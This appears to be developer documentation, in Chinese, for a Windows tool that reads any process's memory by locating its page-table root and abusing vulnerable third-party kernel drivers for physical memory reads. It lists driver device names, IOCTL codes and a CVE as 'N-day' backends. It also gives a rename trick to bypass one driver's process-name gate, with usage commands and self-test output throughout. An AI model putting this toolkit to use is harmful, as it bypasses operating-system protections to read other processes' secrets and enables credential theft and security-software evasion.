# 三层独立架构：定位层 / 翻译层 / 取数层

`membridge/bin/layers.exe` 把任意进程虚拟内存访问拆成 **三个互不依赖的层**：

```
定位层 (locator)      目标 PID/名称 ──► CR3
翻译层 (translator)   CR3 + VA ──────► PA（4 级页表，支持 4KB/2MB/1GB 页）
取数层 (fetcher)      PA + len ──────► bytes（可插拔物理读 provider）
```

三层之间只通过显式数据结构交互，任一层可单独替换/测试：

## 1. 定位层（获取 CR3）
`mb_layer_locate_cr3_*`：

| 策略 | 说明 | 依赖 |
|---|---|---|
| `--cr3 <hex>` | 直接提供 CR3（测试/已知值） | 无 |
| `--locate --pid <pid> --scan-start/--scan-size` | **物理内存扫描**：在物理范围中按 `_EPROCESS` 布局（PID `+0x1D0`、ImageFileName `+0x338`、DirectoryTableBase `+0x28`）定位目标进程并取 CR3 | 仅取数层 |
| `--locate --pid <pid> --auto-ranges` | 同上，范围自动从注册表 `HARDWARE\RESOURCEMAP` 获取 | 仅取数层 |
| `--locate --kkyum --pid <pid>` | **内核 VA 读 + 进程链表遍历**：KKYUM 读 `PsInitialSystemProcess` → `ActiveProcessLinks` → 目标 EPROCESS → CR3（`--kkyum-device` 可指定设备） | 仅内核读 provider（不需要取数层） |
| `--locate --kprl --pid <pid>` | **KPRL `l1malwarebits.sys` CR3-by-PID**：IOCTL `0x239584`（输入 PID，偏移 0x38 返回 CR3；`--kprl-device` 指定设备） | KPRL 驱动（不需要取数层） |

定位层**不需要**翻译层，也不需要页表；扫描策略只需要取数层。

## 2. 翻译层（获取 PA）
`mb_layer_translate(reader, cr3, va, &pa, &page_size)`：
- 4 级页表遍历：PML4 → PDPT → PD → PT；
- 支持 1GB（PDPT.PS）、2MB（PD.PS）、4KB 页；
- 只依赖**取数层**的 `read(pa)`，不依赖定位层；
- 输入显式 CR3 即可独立工作；
- 离线自测已覆盖：4KB 映射、2MB 大页、1GB 大页、跨页组合读。

- 只依赖**取数层**的 `read(pa)`，不依赖定位层；
- 输入显式 CR3 即可独立工作。

## 3. 取数层（获取字节）
`mb_phys_reader` 接口：

```c
typedef struct mb_phys_reader {
    int (*read)(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size);
    ...
} mb_phys_reader;
```

`layers.exe` 内置 provider：
| provider | 设备/协议 |
|---|---|
| `cchwapi` | `\\.\CCHWAPI`，IOCTL `0x8024003C`（u64 PA） |
| `rtkio` | `\\.\rtkio`，IOCTL `0x80002000`（PA 映射到用户 VA） |
| `eneio64` | `\\.\GLCKIo`，IOCTL `0x80102040`（WinIO 物理映射） |
| `asrdrv` | `\\.\AsrDrv109`，CVE-2020-15368 家族 AES 加密外层 IOCTL `0x22EC00` + 物理读 opcode `0x22E808`（Round 27 已静态确认的 AsrDrv(2).sys；动态验证待提权） |
| `mrt` | `\\.\fekern_00`，FireEye/fekern MRT `MRT_IOCTL_READ_PHYSICALMEMORY 0x70F8800C`（`MmCopyMemory` 物理读；设备 ACL SYSTEM-only；动态验证待 SYSTEM） |
| `cpuz` | `\\.\Global\CPUZ152`（fallback `\\.\CPUZ152`），CPU-Z 1.52 物理 dword 读 `0x9C402708`；需 `--expect-first <dword>` 提供目标页首 dword 通过驱动校验；动态验证待提权 |
| `asupio64` | `\\.\AsUpdateio`（ASUS EZ Update 3.00.03），物理映射 IOCTL `0xA040A480`（静态推导 24B 请求 `{interfaceType,busNumber,phys_start,addressSpace,size}` → 返回 user VA）；门控要求当前进程名含 `PEUPDATER.EXE`，需把 layers.exe 复制/改名为 `PEUPDATER.EXE`；动态验证待提权 |
| `mock` | 离线自测用合成物理内存 |

`membridge.exe` 已集成 22 个全 64 位物理读 backend（cchwapi/rtkio/eneio64/hp/gibepext/fastdump/directio/tdeio/icachex/mrt 等）；每个 backend 都只是取数层的一个实现，新增 backend 不影响定位层和翻译层。

## 4. 组合接口
`mb_layer_read_va(reader, cr3, va, buf, len)` 只做组合：
- 逐页调用翻译层 → 得到 PA；
- 然后调用取数层 → 得到字节。
- 不包含定位逻辑（CR3 由调用者提供），保证三层独立。

## 5. 离线验证（无需管理员/驱动）
`layers.exe --selftest-mock` 用**合成物理内存**构造：
- 4 级页表把 `VA 0x400000` 映射到 `PA 0x5000`；
- 伪造 `_EPROCESS`（PID 4242 / MOCK.exe / DTB 0x1000）；
- 分别验证：取数层、翻译层、定位层、三层组合、独立性。

结果（19/19 PASS）：
```
[PASS] 取数层(fetcher): PA=0x5000 bytes match mock data
[PASS] 翻译层(translator): VA=0x400000 -> PA=0x5000 (4KB page)
[PASS] 翻译层(translator): VA=0x400010 -> PA=0x5010 (offset preserved)
[PASS] 翻译层(translator): VA=0x200000 -> PA=0x200000 (2MB page)
[PASS] 三层组合(pipeline): read VA 0x200010 through 2MB page
[PASS] 翻译层(translator): VA=0x40000000 -> PA=0x40000000 (1GB page)
[PASS] 三层组合(pipeline): read VA 0x80001000 through 1GB page
[PASS] 三层组合(pipeline): cross-page read VA 0x400FF0 (two 4KB pages)
[PASS] 翻译层(translator): unmapped VA=0x800000 rejected
[PASS] 取数层(fetcher): asupio64 map request layout (page-aligned)
[PASS] 取数层(fetcher): asupio64 cross-page map request (map size 0x2000)
[PASS] 定位层(locator): PID 4242 / MOCK.exe -> CR3=0x1000 (physical scan)
[PASS] 定位层(locator): fake EPROCESS PA=0x8000
[PASS] 定位层(locator): kernel-reader list walk -> CR3=0x3000 (no physical reader)
[PASS] 定位层(locator): kprl CR3 query request layout (pid at offset 0)
[PASS] 三层组合(pipeline): locate -> translate -> fetch returns mock data
[PASS] 独立性(independence): 取数层 usable without locator/translator
[PASS] 独立性(independence): 翻译层 usable without locator
[PASS] 定位层(locator): registry range parser (Memory/MemoryLarge)
VERDICT=PASS
```

## 6. 与 N-day 候选的映射
| 层 | 可用的 N-day / 驱动 |
|---|---|
| 取数层 | `membridge` 已集成 22 backend；新候选：AsrDrv(2)（任意物理 R/W）、AsUpIO64（物理映射/MSR）、CPU-Z（物理 dword R/W）、FireEye MRT（物理读，SYSTEM-only） |
| 定位层 | 物理扫描策略使用取数层即可（无需内核读驱动）；内核读策略需 KKYUM 等 |
| 翻译层 | 纯算法，任何取数层 provider 都可用 |

## 7. 定位层辅助：自动物理内存范围（无需管理员/驱动）
物理扫描 locator 需要知道物理内存范围。`layers.exe --ranges` 直接读取注册表
`HKEY_LOCAL_MACHINE\HARDWARE\RESOURCEMAP\System Resources\Physical Memory`
的 `.Translated`（REG_RESOURCE_LIST），解析 `CM_PARTIAL_RESOURCE_DESCRIPTOR`
（Memory=3 / MemoryLarge=7，支持 0x200/0x400/0x800 大页长度编码）：

本机实测（Medium 用户，无需管理员/驱动）：
```
[OK] 5 physical memory ranges (registry HARDWARE\RESOURCEMAP):
  [ 0] 0x1000 - 0x9F000  len=0x9E000
  [ 1] 0x100000 - 0xA00000  len=0x900000
  [ 2] 0xA73000 - 0x6D6EB000  len=0x6CC78000
  [ 3] 0x727FF000 - 0x72800000  len=0x1000
  [ 4] 0x100000000 - 0x27F800000  len=0x17F800000
VERDICT=PASS
```
`--locate --pid <pid> --auto-ranges` 会遍历这些范围找 `_EPROCESS`，无需手工给
`--scan-start/--scan-size`（仍需取数层 driver 提供物理读）。

## 8. 用法
```powershell
# 离线三层验证
.\bin\layers.exe --selftest-mock

# 定位层辅助：读取物理内存范围（无需驱动）
.\bin\layers.exe --ranges

# 取数层：物理读
.\bin\layers.exe --reader rtkio --read-phys --pa 0x10000000 --size 0x40

# 取数层：CPU-Z 1.52 物理 dword 读（需提供目标页首 dword）
.\bin\layers.exe --reader cpuz --expect-first 0x42594F56 --read-phys --pa 0x10000000 --size 0x40

# 取数层：AsUpIO64（先把 layers.exe 复制/改名为 PEUPDATER.EXE 以通过门控）
copy .\bin\layers.exe .\bin\PEUPDATER.EXE
.\bin\PEUPDATER.EXE --reader asupio64 --read-phys --pa 0x10000000 --size 0x40

# 取数层：Round 27 的 AsrDrv(2) N-day provider（需先有管理员加载驱动）
.\bin\layers.exe --reader asrdrv --read-phys --pa 0x10000000 --size 0x40

# 定位层（注册表自动范围物理扫描 CR3）+ 翻译层 + 取数层
.\bin\layers.exe --reader rtkio --locate --pid 1234 --auto-ranges --va 0x7FF600000000 --size 0x40

# 定位层（内核 VA 读 + 进程链表，KKYUM；不需要取数层）
.\bin\layers.exe --locate --kkyum --pid 1234

# 定位层（KPRL l1malwarebits CR3-by-PID；不需要取数层）
.\bin\layers.exe --locate --kprl --pid 1234

# 显式 CR3：翻译层 + 取数层
.\bin\layers.exe --reader cchwapi --cr3 0x1A0000 --va 0x7FF600000000 --size 0x40
```
